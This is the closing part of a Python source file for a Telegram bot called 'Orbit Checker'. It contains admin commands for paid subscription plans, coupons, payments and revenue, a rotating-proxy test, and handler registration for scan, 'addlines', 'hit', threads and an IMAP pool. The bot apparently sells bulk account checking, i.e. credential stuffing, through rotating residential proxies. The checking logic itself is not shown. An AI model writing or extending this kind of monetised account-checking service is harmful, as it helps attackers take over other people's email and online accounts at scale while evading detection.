                existing.is_active    = True
                db.commit()
                action = "updated"
            else:
                plan = Plan(
                    name=name, price_usd=price, duration_days=days,
                    threads=threads, daily_limit=daily_limit,
                    session_max=10000, resume=True, queue_skip=True,
                    description=description
                )
                db.add(plan)
                db.commit()
                action = "created"
            daily_str = "∞" if daily_limit >= 999999 else f"{daily_limit:,}"
            await update.message.reply_text(
                f"✅ *Plan {action}!*\n\n"
                f"📦 Name: *{name}*\n"
                f"💰 Price: *${price:.2f}*\n"
                f"⏳ Duration: *{days} days*\n"
                f"🧵 Threads: *{threads}*\n"
                f"📊 Daily: *{daily_str}*\n"
                f"📝 {description}",
                parse_mode='Markdown'
            )
        finally:
            db.close()
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid format. Use: /createplan Name Price Days")


async def deleteplan_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /deleteplan Name"""
    if not is_admin(update.effective_user.id):
        return
    if not context.args:
        await update.message.reply_text("Usage: `/deleteplan PlanName`", parse_mode='Markdown')
        return
    name = context.args[0]
    db   = get_db()
    try:
        plan = db.query(Plan).filter(Plan.name == name).first()
        if not plan:
            await update.message.reply_text(f"❌ Plan '{name}' not found.")
            return
        plan.is_active = False
        db.commit()
        await update.message.reply_text(f"✅ Plan *{name}* deactivated.", parse_mode='Markdown')
    finally:
        db.close()


async def listplans_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /listplans — show all plans"""
    if not is_admin(update.effective_user.id):
        return
    db = get_db()
    try:
        plans = db.query(Plan).order_by(Plan.price_usd).all()
        if not plans:
            await update.message.reply_text("No plans created yet.")
            return
        lines = ["📋 *All Plans*\n"]
        for p in plans:
            status    = "✅" if p.is_active else "❌"
            daily_str = "∞" if p.daily_limit >= 999999 else f"{p.daily_limit:,}"
            lines.append(
                f"{status} *{p.name}* — ${p.price_usd:.2f}\n"
                f"   {p.duration_days}d · {daily_str}/day · {p.threads}t"
            )
        await update.message.reply_text("\n".join(lines), parse_mode='Markdown')
    finally:
        db.close()


async def createcoupon_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: /createcoupon CODE DISCOUNT_PCT [MAX_USES] [FREE_DAYS]"""
    if not is_admin(update.effective_user.id):
        return
    if len(context.args) < 2:
        await update.message.reply_text(
            "*Usage:*\n"
            "`/createcoupon CODE DISCOUNT_PCT [MAX_USES] [FREE_DAYS]`\n\n"
            "*Examples:*\n"
            "`/createcoupon WELCOME50 50 100` — 50% off, 100 uses\n"
            "`/createcoupon VIP100 100 1` — 100% off (free), 1 use\n"
            "`/createcoupon BONUS7 0 50 7` — 0% off + 7 bonus days",
            parse_mode='Markdown'
        )
        return
    try:
        code         = context.args[0].upper()
        discount     = int(context.args[1])
        max_uses     = int(context.args[2]) if len(context.args) > 2 else 1
        free_days    = int(context.args[3]) if len(context.args) > 3 else 0

        if not (0 <= discount <= 100):
            await update.message.reply_text("❌ Discount must be 0-100%")
            return

        db = get_db()
        try:
            existing = db.query(Coupon).filter(Coupon.code == code).first()
            if existing:
                existing.discount_pct = discount
                existing.max_uses     = max_uses
                existing.free_days    = free_days
                existing.is_active    = True
                existing.uses         = 0
                db.commit()
                action = "updated"
            else:
                c = Coupon(code=code, discount_pct=discount, max_uses=max_uses, free_days=free_days)
                db.add(c)
                db.commit()
                action = "created"
            await update.message.reply_text(
                f"✅ *Coupon {action}!*\n\n"
                f"🎟️ Code: `{code}`\n"
                f"💰 Discount: *{discount}%*\n"
                f"🎁 Bonus days: *{free_days}*\n"
                f"🔢 Max uses: *{max_uses}*",
                parse_mode='Markdown'
            )
        finally:
            db.close()
    except (ValueError, IndexError):
        await update.message.reply_text("❌ Invalid format.")


async def listcoupons_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: show all coupons"""
    if not is_admin(update.effective_user.id):
        return
    db = get_db()
    try:
        coupons = db.query(Coupon).order_by(Coupon.created_at.desc()).limit(20).all()
        if not coupons:
            await update.message.reply_text("No coupons created yet.")
            return
        lines = ["🎟️ *Coupons*\n"]
        for c in coupons:
            s = "✅" if c.is_active else "❌"
            lines.append(f"{s} `{c.code}` — {c.discount_pct}% off · {c.uses}/{c.max_uses} uses")
        await update.message.reply_text("\n".join(lines), parse_mode='Markdown')
    finally:
        db.close()


async def payments_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Admin: recent payments"""
    if not is_admin(update.effective_user.id):
        return
    db = get_db()
    try:
        pays = db.query(Payment).order_by(Payment.created_at.desc()).limit(15).all()
        if not pays:
            await update.message.reply_text("No payments yet.")
            return
        lines = ["💳 *Recent Payments*\n"]
        for p in pays:
            icon = "✅" if p.status == 'paid' else ("⏳" if p.status == 'pending' else "❌")
            lines.append(f"{icon} `{p.user_id}` — {p.plan_name} ${p.amount_usd:.2f} [{p.status}]")
        await update.message.reply_text("\n".join(lines), parse_mode='Markdown')
    finally:
        db.close()


async def revenue_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if not is_admin(update.effective_user.id): return
    db = get_db()
    try:
        now = datetime.utcnow()
        counts = {}
        for plan in ('free','weekly','monthly','yearly'):
            counts[plan] = db.query(User).filter(User.plan == plan).count()
        active_vip = db.query(User).filter(
            User.plan != 'free',
            User.plan_expires > now
        ).count()
        weekly_est = (
            counts.get('weekly',0)  * 10 +
            counts.get('monthly',0) * (25/4) +
            counts.get('yearly',0)  * (100/52)
        )
        text = (
            f"💰 *Revenue Dashboard*\n\n"
            f"🆓 Free: `{counts.get('free',0):,}`\n"
            f"📅 Weekly ($10): `{counts.get('weekly',0):,}`\n"
            f"📅 Monthly ($25): `{counts.get('monthly',0):,}`\n"
            f"📅 Yearly ($100): `{counts.get('yearly',0):,}`\n\n"
            f"💎 Active VIPs: `{active_vip:,}`\n\n"
            f"💵 Est. Weekly: `${weekly_est:.0f}`\n"
            f"💵 Est. Monthly: `${weekly_est*4:.0f}`\n"
            f"💵 Est. Annual: `${weekly_est*52:.0f}`"
        )
        await update.message.reply_text(text, parse_mode='Markdown')
    finally:
        db.close()


async def testproxy_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test proxy - hits ipify twice to check if IP rotates."""
    if not is_admin(update.effective_user.id):
        return
    ps = global_proxy_manager.stats()
    if ps['total'] == 0:
        await update.message.reply_text("❌ No proxy loaded. Upload one first.")
        return

    await update.message.reply_text("🔍 Testing proxy... making 3 requests...")

    import requests as _req
    results = []
    proxy   = global_proxy_manager.get_next()
    if not proxy:
        await update.message.reply_text("❌ No proxy available.")
        return

    for i in range(3):
        try:
            r = _req.get(
                'https://api.ipify.org?format=json',
                proxies={'http': proxy.url(), 'https': proxy.url()},
                timeout=10
            )
            ip = r.json().get('ip', 'unknown')
            results.append(ip)
        except Exception as e:
            results.append(f"Error: {str(e)[:30]}")

    unique = len(set(results))
    if all('Error' in r for r in results):
        verdict = "❌ Proxy not working — check credentials"
    elif unique == 1:
        verdict = "📌 STICKY — same IP every request\nUse 15-30 threads max"
    else:
        verdict = "🔄 ROTATING — different IP each request\nUse 100-200 threads"

    text = (
        f"🔬 *Proxy Test Results*\n\n"
        f"Request 1: `{results[0]}`\n"
        f"Request 2: `{results[1]}`\n"
        f"Request 3: `{results[2]}`\n\n"
        f"{verdict}"
    )
    await update.message.reply_text(text, parse_mode='Markdown')



async def mode_cmd(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Quick mode change via command: /mode 7"""
    uid = update.effective_user.id
    db_user = get_or_create_user(uid)
    if context.args:
        try:
            m = int(context.args[0])
            if m in API_MODES:
                db = get_db()
                try:
                    u = db.query(User).filter(User.telegram_id == uid).first()
                    if u:
                        u.current_mode = m
                        db.commit()
                    await update.message.reply_text(
                        f"✅ Mode set to: *{get_mode_name(m)}*", parse_mode='Markdown')
                finally:
                    db.close()
            else:
                modes = '\n'.join(f"{k}: {v['name']}" for k,v in API_MODES.items())
                await update.message.reply_text(f"Available modes:\n{modes}")
        except ValueError:
            await update.message.reply_text("Usage: /mode <number>")
    else:
        modes = '\n'.join(f"{k}: {v['name']}" for k,v in API_MODES.items())
        await update.message.reply_text(f"Current: *{get_mode_name(db_user.current_mode)}*\n\n{modes}", parse_mode='Markdown')


def main():
    import asyncio
    from telegram.ext import (
        ApplicationBuilder, CommandHandler, MessageHandler,
        CallbackQueryHandler, InlineQueryHandler, filters
    )
    from core.config import BOT_TOKEN, USE_WEBHOOK, WEBHOOK_URL, WEBHOOK_SECRET, WEBHOOK_PORT
    from core.database import init_db
    from core.proxy_manager import global_proxy_manager
    from core.config import GLOBAL_PROXY_FILE
    from core.proxy_manager import imap_pool
    from core.config import PROXY_HEALTH_INTERVAL

    # Init DB
    init_db()

    # Load global proxies
    if os.path.exists(GLOBAL_PROXY_FILE):
        n = global_proxy_manager.load_from_file(GLOBAL_PROXY_FILE)
        logger.debug(f"Loaded {n} global proxies from {GLOBAL_PROXY_FILE}")

    # Start proxy health checker
    global_proxy_manager.start_health_checker(interval=PROXY_HEALTH_INTERVAL)

    # Build app
    app = ApplicationBuilder().token(BOT_TOKEN).build()

    # Register handlers
    app.add_handler(CommandHandler("start",     start_command))
    app.add_handler(CommandHandler("cancel",    cancel_cmd))
    app.add_handler(CommandHandler("addvip",    addvip_cmd))
    app.add_handler(CommandHandler("rmvip",     rmvip_cmd))
    app.add_handler(CommandHandler("ban",       ban_cmd))
    app.add_handler(CommandHandler("unban",     unban_cmd))
    app.add_handler(CommandHandler("broadcast", broadcast_cmd))
    app.add_handler(CommandHandler("addlines",  addlines_cmd))
    app.add_handler(CommandHandler("stats",      stats_cmd))
    app.add_handler(CommandHandler("startmulti", startmulti_cmd))
    app.add_handler(CommandHandler("history",    history_cmd))
    app.add_handler(CommandHandler("leaderboard",leaderboard_cmd))
    app.add_handler(CommandHandler("status",     status_cmd))
    app.add_handler(CommandHandler("setwebhook", setwebhook_cmd))
    app.add_handler(CommandHandler("givebonus",  givebonus_cmd))
    app.add_handler(CommandHandler("announce",   announce_cmd))
    app.add_handler(CommandHandler("revenue",     revenue_cmd))
    # Plan & payment commands
    app.add_handler(CommandHandler("membership",  membership_cmd))
    app.add_handler(CommandHandler("createplan",  createplan_cmd))
    app.add_handler(CommandHandler("deleteplan",  deleteplan_cmd))
    app.add_handler(CommandHandler("listplans",   listplans_cmd))
    app.add_handler(CommandHandler("createcoupon",createcoupon_cmd))
    app.add_handler(CommandHandler("listcoupons", listcoupons_cmd))
    app.add_handler(CommandHandler("payments",    payments_cmd))
    app.add_handler(CommandHandler("redeem",      redeem_coupon_cmd))
    app.add_handler(CommandHandler("mystats",    mystats_cmd))
    app.add_handler(CommandHandler("topmode",    topmode_cmd))
    app.add_handler(CommandHandler("clearqueue", clearqueue_cmd))
    app.add_handler(CommandHandler("help",       help_cmd))
    app.add_handler(CommandHandler("scan",       scan_cmd))
    app.add_handler(CommandHandler("multi",      multi_cmd))
    app.add_handler(CommandHandler("pause",      pause_cmd))
    app.add_handler(CommandHandler("resume",     resume_cmd))
    app.add_handler(CommandHandler("stop",       stop_cmd))
    app.add_handler(CommandHandler("settings",   settings_cmd))
    app.add_handler(CommandHandler("apimode",    apimode_cmd))
    app.add_handler(CommandHandler("threads",    threads_cmd))
    app.add_handler(CommandHandler("mode",       mode_cmd))
    app.add_handler(CommandHandler("keywords",   keywords_cmd))
    app.add_handler(CommandHandler("referrals",  myref_cmd))
    app.add_handler(CommandHandler("queue",      queue_cmd))
    app.add_handler(CommandHandler("support",    support_cmd))

    app.add_handler(CommandHandler("startscan",  startscan_cmd))
    app.add_handler(CommandHandler("testproxy",  testproxy_cmd))
    app.add_handler(CommandHandler("linkmod",    linkmod_cmd))
    app.add_handler(CommandHandler("lang",       lang_cmd))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.ALL, file_handler))
    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, text_handler))

    # Wire scan queue callbacks
    scan_queue.set_callbacks(
        progress = on_scan_progress,
        hit      = on_scan_hit,
        complete = on_scan_complete,
    )

    async def _startup(app):
        """Start background tasks after bot is running."""
        from core.resilience import MemoryMonitor, recover_interrupted_scans
        # auto_refill_pool import removed — residential proxies managed manually
        from core.smart_notifications import notif_manager
        from core.config import ADMIN_IDS

        # Set bot reference for notifications
        notif_manager.set_bot(app.bot)

        # Start scan queue
        await scan_queue.start()

        # Background tasks
        asyncio.create_task(run_daily_reset())
        asyncio.create_task(run_subscription_monitor(app.bot))
        asyncio.create_task(MemoryMonitor.watch(app.bot, ADMIN_IDS))
        # auto_refill_pool disabled — user manages their own residential proxies
        asyncio.create_task(notif_manager.cleanup_old_dedup_keys())

        # Start scan watchdog
        from core.resilience import ScanWatchdog
        watchdog = ScanWatchdog(active_scans)
        await watchdog.start()

        # Recover any interrupted scans from before restart
        asyncio.create_task(recover_interrupted_scans(app.bot))

        logger.debug("Orbit Checker fully started — all smart systems active")

    async def _shutdown(app):
        await scan_queue.stop()
        global_proxy_manager.stop_health_checker()
        logger.debug("Orbit Checker shutdown complete")

    app.post_init     = _startup
    app.post_shutdown = _shutdown

    if USE_WEBHOOK:
        logger.debug(f"Starting webhook on port {WEBHOOK_PORT}")
        app.run_webhook(
            listen         = "0.0.0.0",
            port           = WEBHOOK_PORT,
            url_path       = "webhook",
            webhook_url    = WEBHOOK_URL,
            secret_token   = WEBHOOK_SECRET,
        )
    else:
        logger.debug("Starting polling")
        app.run_polling(drop_pending_updates=True)



if __name__ == '__main__':
    import sys
    import os
    # Add current directory to path so checkers/ and core/ import correctly
    sys.path.insert(0, os.path.dirname(os.path.abspath(__file__ if '__file__' in dir() else os.getcwd())))
    try:
        main()
    except KeyboardInterrupt:
        logger.debug("Bot stopped by user.")
    except Exception as e:
        logger.critical(f"Fatal error: {e}", exc_info=True)
        sys.exit(1)
